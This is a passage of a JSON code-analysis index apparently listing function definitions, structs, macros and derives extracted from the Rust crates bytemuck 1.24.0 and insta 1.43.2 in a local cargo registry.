          "assert_ne!(b_offset, c_offset);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Default)]",
          "#[derive(Debug, Copy, Clone, PartialEq)]",
          "#[derive(Default)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/tests/std_tests.rs",
        "function_defs": [
          "fn test_transparent_vtabled() {",
          "fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {",
          "fn test_large_box_alloc() {",
          "fn test_zero_sized_box_alloc() {",
          "fn test_try_from_box_bytes() {",
          "fn test_box_bytes_of() {"
        ],
        "struct_defs": [
          "struct DisplayTraitObj(dyn Display);",
          "struct Empty;",
          "struct Foo(u8, u16);"
        ],
        "impl_blocks": [
          "impl Display for DisplayTraitObj {"
        ],
        "uses": [
          "use bytemuck::*;",
          "use core::num::NonZeroU8;",
          "use core::fmt::Display;"
        ],
        "macros": [
          "let s = format!(\"{}\", v);",
          "assert_eq!(s, \"5\");",
          "let s = format!(\"{}\", v_mut);",
          "assert_eq!(s, \"100\");",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(*from_box_bytes::<u32>(Box::new(1000u32).into()), 1000u32);",
          "assert_eq!(&*from_box_bytes::<[u8; 5]>(Box::new(*b\"hello\").into()), b\"hello\");",
          "assert_eq!(",
          "assert_eq!(&*box_bytes_of(Box::new(*b\"hello\")), b\"hello\");",
          "assert_eq!(&*box_bytes_of(Box::new(0x12345678)), b\"\\x12\\x34\\x56\\x78\");",
          "assert_eq!(&*box_bytes_of(Box::new(0x12345678)), b\"\\x78\\x56\\x34\\x12\");",
          "assert_eq!(&*box_bytes_of(Box::new(NonZeroU8::new(0xc5))), b\"\\xc5\");"
        ],
        "derives": [
          "#[derive(Debug, Copy, Clone, PartialEq, Eq, AnyBitPattern)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/tests/offset_of_tests.rs",
        "function_defs": [
          "fn test_offset_of_vertex() {",
          "fn test_offset_of_foo() {"
        ],
        "struct_defs": [
          "struct Vertex {",
          "struct Foo {"
        ],
        "impl_blocks": [],
        "uses": [
          "use bytemuck::{offset_of, Zeroable};"
        ],
        "macros": [
          "let pos = offset_of!(Zeroable::zeroed(), Vertex, pos);",
          "let uv = offset_of!(Zeroable::zeroed(), Vertex, uv);",
          "let color = offset_of!(Zeroable::zeroed(), Vertex, color);",
          "assert_eq!(pos, 0);",
          "assert_eq!(uv, 8);",
          "assert_eq!(color, 12);",
          "let a_offset = offset_of!(Default::default(), Foo, a);",
          "let b_offset = offset_of!(Default::default(), Foo, b);",
          "let c_offset = offset_of!(Default::default(), Foo, c);",
          "assert_ne!(a_offset, b_offset);",
          "assert_ne!(b_offset, c_offset);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Default)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/derive.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [
          "impl EnumTagIntegerBytes for [u8; core::mem::size_of::<$ty>()] {"
        ],
        "uses": [],
        "macros": [
          "enum_tag_integer_impls!(u8, u16, u32, u64, u128);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/pod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::*;"
        ],
        "macros": [
          "impl_unsafe_marker_for_array!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!("
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/pod_in_option.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::*;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/zeroable.rs",
        "function_defs": [
          "fn zeroed() -> Self {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::*;",
          "use super::Zeroable;"
        ],
        "macros": [
          "impl_unsafe_marker_for_array!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!(",
          "impl_unsafe_marker_for_simd!("
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/transparent.rs",
        "function_defs": [
          "fn wrap(s: Inner) -> Self",
          "fn wrap_ref(s: &Inner) -> &Self {",
          "fn wrap_mut(s: &mut Inner) -> &mut Self {",
          "fn wrap_slice(s: &[Inner]) -> &[Self]",
          "fn wrap_slice_mut(s: &mut [Inner]) -> &mut [Self]",
          "fn peel(s: Self) -> Inner",
          "fn peel_ref(s: &Self) -> &Inner {",
          "fn peel_mut(s: &mut Self) -> &mut Inner {",
          "fn peel_slice(s: &[Self]) -> &[Inner]",
          "fn peel_slice_mut(s: &mut [Self]) -> &mut [Inner]"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::*;"
        ],
        "macros": [
          "/// assert_eq!(&s.0, &[1, 2, 3]);",
          "assert!(size_of::<Inner>() == size_of::<Self>());",
          "assert!(align_of::<Inner>() == align_of::<Self>());",
          "unsafe { transmute!(s) }",
          "assert!(size_of::<*const Inner>() == size_of::<*const Self>());",
          "let wrapper_ptr: *const Self = transmute!(inner_ptr);",
          "assert!(size_of::<*mut Inner>() == size_of::<*mut Self>());",
          "let wrapper_ptr: *mut Self = transmute!(inner_ptr);",
          "assert!(size_of::<Inner>() == size_of::<Self>());",
          "assert!(align_of::<Inner>() == align_of::<Self>());",
          "assert!(size_of::<Inner>() == size_of::<Self>());",
          "assert!(align_of::<Inner>() == align_of::<Self>());",
          "assert!(size_of::<Inner>() == size_of::<Self>());",
          "assert!(align_of::<Inner>() == align_of::<Self>());",
          "unsafe { transmute!(s) }",
          "assert!(size_of::<*const Inner>() == size_of::<*const Self>());",
          "let inner_ptr: *const Inner = transmute!(wrapper_ptr);",
          "assert!(size_of::<*mut Inner>() == size_of::<*mut Self>());",
          "let inner_ptr: *mut Inner = transmute!(wrapper_ptr);",
          "assert!(size_of::<Inner>() == size_of::<Self>());",
          "assert!(align_of::<Inner>() == align_of::<Self>());",
          "assert!(size_of::<Inner>() == size_of::<Self>());",
          "assert!(align_of::<Inner>() == align_of::<Self>());"
        ],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/lib.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut core::fmt::Formatter) -> core::fmt::Result {",
          "fn drop(&mut self) {"
        ],
        "struct_defs": [
          "struct EnsureZeroWrite<T>(*mut T);"
        ],
        "impl_blocks": [
          "impl core::fmt::Display for PodCastError {",
          "impl std::error::Error for PodCastError {}",
          "impl core::error::Error for PodCastError {}"
        ],
        "uses": [
          "use core::arch::aarch64;",
          "use core::arch::wasm32;",
          "use core::arch::x86;",
          "use core::arch::x86_64;",
          "use core::{"
        ],
        "macros": [
          "impl_unsafe_marker_for_simd!($( #[cfg($cfg_predicate)] )? unsafe impl $trait for",
          "write!(f, \"{:?}\", self)"
        ],
        "derives": [
          "#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]"
        ],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/contiguous.rs",
        "function_defs": [
          "fn from_integer(value: Self::Int) -> Option<Self> {",
          "fn into_integer(self) -> Self::Int {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::*;"
        ],
        "macros": [
          "/// assert_eq!(Foo::from_integer(3).unwrap(), Foo::D);",
          "/// assert_eq!(Foo::from_integer(8), None);",
          "/// assert_eq!(Foo::C.into_integer(), 2);",
          "assert!(size_of::<Self>() == size_of::<Self::Int>());",
          "Some(unsafe { transmute!(value) })",
          "assert!(size_of::<Self>() == size_of::<Self::Int>());",
          "unsafe { transmute!(self) }"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/zeroable_in_option.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::*;"
        ],
        "macros": [
          "impl_for_unwind_fn!($($ArgTy),*);",
          "impl_for_fn!();",
          "impl_for_fn!(A);",
          "impl_for_fn!(A, B);",
          "impl_for_fn!(A, B, C);",
          "impl_for_fn!(A, B, C, D);",
          "impl_for_fn!(A, B, C, D, E);",
          "impl_for_fn!(A, B, C, D, E, F);",
          "impl_for_fn!(A, B, C, D, E, F, G);",
          "impl_for_fn!(A, B, C, D, E, F, G, H);",
          "impl_for_fn!(A, B, C, D, E, F, G, H, I);",
          "impl_for_fn!(A, B, C, D, E, F, G, H, I, J);",
          "impl_for_fn!(A, B, C, D, E, F, G, H, I, J, K);",
          "impl_for_fn!(A, B, C, D, E, F, G, H, I, J, K, L);",
          "impl_for_fn!(A, B, C, D, E, F, G, H, I, J, K, L, M);"
        ],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/internal.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::PodCastError;",
          "use core::{marker::*, mem::*};"
        ],
        "macros": [
          "panic!(\"{src}>{err}\", src = _src, err = _err);",
          "panic!(\"Called a panicing helper from bytemuck which paniced\");",
          "Err(_) => unreachable!(),",
          "Err(_) => unreachable!(),",
          "unsafe { transmute!(a) }",
          "Err(_) => unreachable!(),",
          "Err(_) => unreachable!(),",
          "Ok(unsafe { transmute!(a) })"
        ],
        "derives": [],
        "error_handling": 13
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/must.rs",
        "function_defs": [],
        "struct_defs": [
          "struct Cast<A, B>((A, B));"
        ],
        "impl_blocks": [],
        "uses": [
          "use crate::{AnyBitPattern, NoUninit};",
          "use core::mem::{align_of, size_of};"
        ],
        "macros": [
          "assert!(align_of::<A>() >= align_of::<B>());",
          "const ASSERT_SIZE_EQUAL: () = assert!(size_of::<A>() == size_of::<B>());",
          "const ASSERT_SIZE_MULTIPLE_OF_OR_INPUT_ZST: () = assert!(",
          "unsafe { transmute!(A; B; a) }"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/offset_of.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "/// assert_eq!(offset_of!(val, MyNotDefaultType, some_field), 4);",
          "/// assert_eq!(offset_of!(Vertex, loc), 0);",
          "/// assert_eq!(offset_of!(Vertex, color), 12);",
          "/// let _offset = bytemuck::offset_of!(Example, field);",
          "///   let _offset = bytemuck::offset_of!(Example, field);",
          "assert!(result <= $crate::__core::mem::size_of::<$Type>());",
          "$crate::offset_of!(<$Type as Default>::default(), $Type, $field)"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/checked.rs",
        "function_defs": [
          "fn is_valid_bit_pattern(bits: &Self::Bits) -> bool;",
          "fn is_valid_bit_pattern(_bits: &T) -> bool {",
          "fn is_valid_bit_pattern(bits: &Self::Bits) -> bool {",
          "fn is_valid_bit_pattern(bits: &Self::Bits) -> bool {",
          "fn is_valid_bit_pattern(bits: &Self::Bits) -> bool {",
          "fn fmt(&self, f: &mut core::fmt::Formatter) -> core::fmt::Result {",
          "fn from(err: crate::PodCastError) -> CheckedCastError {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl core::fmt::Display for CheckedCastError {",
          "impl std::error::Error for CheckedCastError {}",
          "impl core::error::Error for CheckedCastError {}",
          "impl From<crate::PodCastError> for CheckedCastError {"
        ],
        "uses": [
          "use crate::{"
        ],
        "macros": [
          "/// assert_eq!(result, Ok(&MyEnum::Variant2));",
          "/// assert!(result.is_err());",
          "///   assert_eq!(as_enum_mut, &mut MyEnum::Variant2);",
          "/// assert_eq!(my_u32, 0u32);",
          "write!(f, \"{:?}\", self)",
          "Ok(unsafe { transmute!(pod) })",
          "Ok(unsafe { transmute!(pod) })"
        ],
        "derives": [
          "#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]"
        ],
        "error_handling": 21
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/allocation.rs",
        "function_defs": [
          "fn wrap_vec(s: Vec<Inner>) -> Vec<Self>",
          "fn wrap_box(s: Box<Inner>) -> Box<Self> {",
          "fn wrap_rc(s: Rc<Inner>) -> Rc<Self> {",
          "fn wrap_arc(s: Arc<Inner>) -> Arc<Self> {",
          "fn peel_vec(s: Vec<Self>) -> Vec<Inner>",
          "fn peel_box(s: Box<Self>) -> Box<Inner> {",
          "fn peel_rc(s: Rc<Self>) -> Rc<Inner> {",
          "fn peel_arc(s: Arc<Self>) -> Arc<Inner> {",
          "fn deref(&self) -> &Self::Target {",
          "fn deref_mut(&mut self) -> &mut Self::Target {",
          "fn drop(&mut self) {",
          "fn from(value: Box<T>) -> Self {",
          "fn box_bytes_of(self: Box<Self>) -> BoxBytes;",
          "fn try_from_box_bytes(",
          "fn box_bytes_of(self: Box<Self>) -> BoxBytes {",
          "fn box_bytes_of(self: Box<Self>) -> BoxBytes {",
          "fn box_bytes_of(self: Box<Self>) -> BoxBytes {",
          "fn try_from_box_bytes(",
          "fn try_from_box_bytes("
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Deref for BoxBytes {",
          "impl DerefMut for BoxBytes {",
          "impl Drop for BoxBytes {",
          "impl sealed::BoxBytesOf for str {",
          "impl BoxBytes {"
        ],
        "uses": [
          "use super::*;",
          "use alloc::sync::Arc;",
          "use alloc::{",
          "use core::{",
          "use crate::{BoxBytes, PodCastError};",
          "use alloc::boxed::Box;"
        ],
        "macros": [
          "/// if cfg!(target_endian = \"little\") {",
          "///   assert_eq!(&vec_of_words[..], &[0x0006_0005, 0x0008_0007][..])",
          "///   assert_eq!(&vec_of_words[..], &[0x0005_0006, 0x0007_0008][..])",
          "assert!(size_of::<*mut Inner>() == size_of::<*mut Self>());",
          "let wrapper_ptr: *mut Self = transmute!(inner_ptr);",
          "assert!(size_of::<*mut Inner>() == size_of::<*mut Self>());",
          "let wrapper_ptr: *const Self = transmute!(inner_ptr);",
          "assert!(size_of::<*mut Inner>() == size_of::<*mut Self>());",
          "let wrapper_ptr: *const Self = transmute!(inner_ptr);",
          "assert!(size_of::<*mut Inner>() == size_of::<*mut Self>());",
          "let inner_ptr: *mut Inner = transmute!(wrapper_ptr);",
          "assert!(size_of::<*mut Inner>() == size_of::<*mut Self>());",
          "let inner_ptr: *const Inner = transmute!(wrapper_ptr);",
          "assert!(size_of::<*mut Inner>() == size_of::<*mut Self>());",
          "let inner_ptr: *const Inner = transmute!(wrapper_ptr);"
        ],
        "derives": [],
        "error_handling": 33
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/no_uninit.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::Pod;",
          "use core::num::{"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytemuck-1.24.0/src/anybitpattern.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::{Pod, Zeroable};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2",
    "name": "insta-1.43.2",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/tests/test_inline.rs",
        "function_defs": [
          "fn test_simple() {",
          "fn test_trailing_commas() {",
          "fn test_single_line() {",
          "fn test_unnamed_thread_single_line() {",
          "fn test_newline() {",
          "fn test_inline_debug_expr() {",
          "fn test_csv_inline() {",
          "fn test_csv_inline_multiple_values() {",
          "fn test_ron_inline() {",
          "fn test_toml_inline() {",
          "fn test_json_inline() {",
          "fn test_yaml_inline() {",
          "fn test_yaml_inline_redacted() {",
          "fn test_non_basic_plane() {",
          "fn test_multiline_with_empty_lines() {",
          "fn test_compact_json() {",
          "fn test_compact_debug() {",
          "fn test_inline_test_in_loop() {",
          "fn test_inline_snapshot_whitespace() {",
          "fn test_indentation() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use insta::assert_csv_snapshot;",
          "use insta::assert_ron_snapshot;",
          "use insta::assert_toml_snapshot;",
          "use insta::assert_yaml_snapshot;",
          "use insta::{assert_compact_json_snapshot, assert_json_snapshot};",
          "use insta::{assert_compact_debug_snapshot, assert_debug_snapshot, assert_snapshot};",
          "use std::thread;"
        ],
        "macros": [
          "assert_debug_snapshot!(vec![1, 2, 3, 4], @r\"",
          "assert_snapshot!(",
          "assert_snapshot!(\"Testing\", @\"Testing\");",
          "assert_snapshot!(\"Testing-thread\");",
          "assert_snapshot!(\"Testing-thread-2\");",
          "assert_snapshot!(\"\\n\", @\"\");",
          "assert_snapshot!(\"hello\", \"a debug expr\", @\"hello\");",
          "assert_csv_snapshot!(User {",
          "assert_csv_snapshot!(vec![user1, user2], @r###\"",
          "assert_ron_snapshot!(User {",
          "assert_toml_snapshot!(User {",
          "assert_json_snapshot!(vec![\"foo\", \"bar\"], @r#\"",
          "assert_yaml_snapshot!(User {",
          "assert_yaml_snapshot!(User {",
          "assert_snapshot!(\"a \ud83d\ude00oeu\", @\"a \ud83d\ude00oeu\");",
          "assert_snapshot!(\"# first\\nsecond\\n  third\\n\\n# alternative\", @r\"",
          "assert_compact_json_snapshot!((1..30).collect::<Vec<_>>(), @\"[1, 2, 3, 4, 5, 6, ",
          "assert_compact_json_snapshot!((1..34).collect::<Vec<_>>(), @r\"",
          "assert_compact_debug_snapshot!((1..30).collect::<Vec<_>>(), @\"[1, 2, 3, 4, 5, 6,",
          "assert_compact_debug_snapshot!((1..34).collect::<Vec<_>>(), @\"[1, 2, 3, 4, 5, 6,",
          "assert_snapshot!(i.to_string(), @\"0\");",
          "assert_snapshot!(\"\\n\\nfoo\\n\\n    bar\\n\\n\", @r\"",
          "assert_snapshot!(\"aaa\\nbbb\\nccc\\nddd\", @r\""
        ],
        "derives": [
          "#[derive(serde::Serialize)]",
          "#[derive(serde::Serialize)]",
          "#[derive(serde::Serialize)]",
          "#[derive(serde::Serialize)]",
          "#[derive(serde::Serialize)]",
          "#[derive(serde::Serialize)]",
          "#[derive(serde::Serialize)]",
          "#[derive(serde::Serialize)]",
          "#[derive(serde::Serialize)]",
          "#[derive(serde::Serialize)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/tests/test_advanced.rs",
        "function_defs": [
          "fn test_basic_filter() {",
          "fn test_basic_suffixes() {",
          "fn test_basic_duplicates_passes() {",
          "fn test_basic_duplicates_assertion_failed() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use insta::{allow_duplicates, assert_debug_snapshot};",
          "use insta::{assert_snapshot, with_settings};"
        ],
        "macros": [
          "with_settings!({filters => vec![",
          "assert_snapshot!(\"Hello DEADBEEF!\", @\"Hello [SHORT_HEX]!\");",
          "insta::with_settings!({snapshot_suffix => value.to_string()}, {",
          "insta::assert_json_snapshot!(&value);",
          "assert_debug_snapshot!(is_even, @\"true\");",
          "assert_debug_snapshot!(is_even, @\"true\");"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/tests/test_basic.rs",
        "function_defs": [
          "fn test_debug_vector() {",
          "fn test_unnamed_debug_vector() {",
          "fn test_unnamed_nested_closure() {",
          "fn test_yaml_vector() {",
          "fn test_unnamed_yaml_vector() {",
          "fn test_json_vector() {",
          "fn test_unnamed_json_vector() {",
          "fn test_nested_module() {",
          "fn test_trailing_commas() {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> Result<(), fmt::Error> {",
          "fn test_display() {",
          "fn test_unnamed_display() {",
          "fn test_u128_json() {",
          "fn insta_sort_order() {",
          "fn test_crlf() {",
          "fn test_trailing_crlf() {",
          "fn test_trailing_crlf_inline() {"
        ],
        "struct_defs": [
          "struct TestDisplay;"
        ],
        "impl_blocks": [
          "impl fmt::Display for TestDisplay {"
        ],
        "uses": [
          "use insta::assert_json_snapshot;",
          "use insta::assert_yaml_snapshot;",
          "use insta::{assert_debug_snapshot, assert_display_snapshot, assert_snapshot};",
          "use std::fmt;",
          "use std::collections::HashMap;"
        ],
        "macros": [
          "assert_debug_snapshot!(\"debug_vector\", vec![1, 2, 3]);",
          "assert_debug_snapshot!(vec![1, 2, 3]);",
          "assert_debug_snapshot!(vec![1, 2, 3, 4]);",
          "assert_debug_snapshot!(vec![1, 2, 3, 4, 5]);",
          "assert_debug_snapshot!(vec![1, 2, 3]);",
          "assert_yaml_snapshot!(\"yaml_vector\", vec![1, 2, 3]);",
          "assert_yaml_snapshot!(vec![1, 2, 3]);",
          "assert_yaml_snapshot!(vec![1, 2, 3, 4]);",
          "assert_yaml_snapshot!(vec![1, 2, 3, 4, 5]);",
          "assert_json_snapshot!(\"json_vector\", vec![1, 2, 3]);",
          "assert_json_snapshot!(vec![1, 2, 3]);",
          "assert_json_snapshot!(vec![1, 2, 3, 4]);",
          "assert_json_snapshot!(vec![1, 2, 3, 4, 5]);",
          "insta::assert_snapshot!(\"aoeu\");",
          "assert_snapshot!(\"Testing\",);",
          "assert_snapshot!(\"Testing\", \"name\",);",
          "assert_snapshot!(\"Testing\", \"name\", \"expr\",);",
          "assert_yaml_snapshot!(vec![1, 2, 3, 4, 5],);",
          "write!(f, \"TestDisplay struct\")",
          "assert_display_snapshot!(\"display\", td);",
          "assert_display_snapshot!(td);",
          "assert_display_snapshot!(\"whatever\");",
          "assert_json_snapshot!(&x, @\"36893488147419103230\");",
          "insta::with_settings!({sort_maps =>true}, {",
          "insta::assert_yaml_snapshot!(m);",
          "insta::assert_snapshot!(\"foo\\r\\nbar\\r\\nbaz\");",
          "insta::assert_snapshot!(\"foo\\r\\nbar\\r\\nbaz\\r\\n\");",
          "insta::assert_snapshot!(\"foo\\r\\nbar\\r\\nbaz\\r\\n\", @r\""
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/tests/test_settings.rs",
        "function_defs": [
          "fn test_simple() {",
          "fn test_bound_to_scope() {",
          "fn test_settings_macro() {",
          "fn test_snapshot_path() {",
          "fn test_snapshot_no_module_prepending() {",
          "fn test_snapshot_with_description() {",
          "fn test_snapshot_with_description_and_raw_info() {",
          "fn test_snapshot_with_description_and_info() {",
          "fn test_with_settings_inherit() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use insta::assert_yaml_snapshot;",
          "use similar_asserts::assert_eq;",
          "use insta::{assert_debug_snapshot, with_settings, Settings};",
          "use insta::internals::Content;"
        ],
        "macros": [
          "assert_yaml_snapshot!(&map, @r\"",
          "assert_yaml_snapshot!(&map, @r\"",
          "assert!(!Settings::clone_current().sort_maps());",
          "with_settings!({sort_maps => true}, {",
          "insta::assert_yaml_snapshot!(&map, @r\"",
          "with_settings!({snapshot_path => \"snapshots2\"}, {",
          "assert_debug_snapshot!(vec![1, 2, 3]);",
          "with_settings!({prepend_module_to_snapshot => false}, {",
          "assert_debug_snapshot!(vec![1, 2, 3]);",
          "with_settings!({description => \"The snapshot is three integers\"}, {",
          "assert_debug_snapshot!(vec![1, 2, 3])",
          "with_settings!({description => \"The snapshot is four integers\", raw_info => &raw",
          "assert_debug_snapshot!(vec![1, 2, 3, 4])",
          "with_settings!({description => \"The snapshot is four integers\", info => &info}, ",
          "assert_debug_snapshot!(vec![1, 2, 3, 4])",
          "with_settings!({sort_maps => true}, {",
          "with_settings!({description => \"aha\"}, {",
          "assert!(settings.sort_maps());",
          "assert_eq!(settings.description(), Some(\"aha\"));"
        ],
        "derives": [
          "#[derive(serde::Serialize)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/tests/test_redaction.rs",
        "function_defs": [
          "fn test_selector_parser() {",
          "fn test_with_random_value() {",
          "fn test_with_random_value_inline_callback() {",
          "fn test_with_random_value_and_trailing_comma() {",
          "fn test_with_random_value_and_match_comma() {",
          "fn test_with_random_value_csv() {",
          "fn test_with_random_value_csv_match() {",
          "fn test_with_random_value_ron() {",
          "fn test_with_random_value_ron_match() {",
          "fn test_with_random_value_toml() {",
          "fn test_with_random_value_toml_match() {",
          "fn test_with_random_value_json() {",
          "fn test_with_random_value_json_match() {",
          "fn test_with_random_value_json_settings() {",
          "fn test_with_callbacks() {",
          "fn test_with_random_value_json_settings2() {",
          "fn test_redact_newtype_struct() {",
          "fn test_redact_newtype_enum() {",
          "fn test_redact_recursive() {",
          "fn test_struct_array_redaction() {",
          "fn test_map_key_redaction() {",
          "fn test_ordering() {",
          "fn test_ordering_newtype_set() {",
          "fn test_rounded_redaction() {",
          "fn test_named_redacted_with_debug_expr() {",
          "fn test_named_redacted_supported_form() {"
        ],
        "struct_defs": [
          "struct Key {",
          "struct Foo {"
        ],
        "impl_blocks": [],
        "uses": [
          "use insta::_macro_support::Selector;",
          "use insta::assert_csv_snapshot;",
          "use insta::assert_json_snapshot;",
          "use insta::assert_ron_snapshot;",
          "use insta::assert_toml_snapshot;",
          "use insta::assert_yaml_snapshot;",
          "use insta::assert_debug_snapshot;",
          "use serde::Serialize;"
        ],
        "macros": [
          "assert_debug_snapshot!($short, Selector::parse($sel).unwrap());",
          "assert_selector_snapshot!(\"foo_bar\", \".foo.bar\");",
          "assert_selector_snapshot!(\"foo_bar_alt\", \".foo[\\\"bar\\\"]\");",
          "assert_selector_snapshot!(\"foo_bar_full_range\", \".foo.bar[]\");",
          "assert_selector_snapshot!(\"foo_bar_range_to\", \".foo.bar[:10]\");",
          "assert_selector_snapshot!(\"foo_bar_range_from\", \".foo.bar[10:]\");",
          "assert_selector_snapshot!(\"foo_bar_range\", \".foo.bar[10:20]\");",
          "assert_selector_snapshot!(\"foo_bar_deep\", \".foo.bar.**\");",
          "assert_yaml_snapshot!(&User {",
          "assert_yaml_snapshot!(&User {",
          "similar_asserts::assert_eq!(path.to_string(), \".id\");",
          "similar_asserts::assert_eq!(value.as_u64().unwrap(), 23);",
          "assert_yaml_snapshot!(&User {",
          "assert_yaml_snapshot!(",
          "assert_yaml_snapshot!(",
          "assert_yaml_snapshot!(",
          "assert_csv_snapshot!(\"user_csv\", &User {",
          "assert_csv_snapshot!(",
          "assert_ron_snapshot!(\"user_ron\", &User {",
          "assert_ron_snapshot!(",
          "assert_toml_snapshot!(\"user_toml\", &User {",
          "assert_toml_snapshot!(",
          "assert_json_snapshot!(\"user_json\", &User {",
          "assert_json_snapshot!(",
          "assert_json_snapshot!(",
          "similar_asserts::assert_eq!(path.to_string(), \".id\");",
          "similar_asserts::assert_eq!(value.as_u64().unwrap(), 1234);",
          "assert_json_snapshot!(",
          "insta::with_settings!({redactions => vec![",
          "assert_json_snapshot!(",
          "assert_json_snapshot!(wrapper, {",
          "assert_yaml_snapshot!(visitor, {",
          "assert_yaml_snapshot!(admin, {",
          "assert_json_snapshot!(root, {",
          "assert_yaml_snapshot!(vec![checkout], {",
          "assert_yaml_snapshot!(foo_value, {",
          "assert_json_snapshot!(",
          "assert_json_snapshot!(",
          "assert_json_snapshot!(",
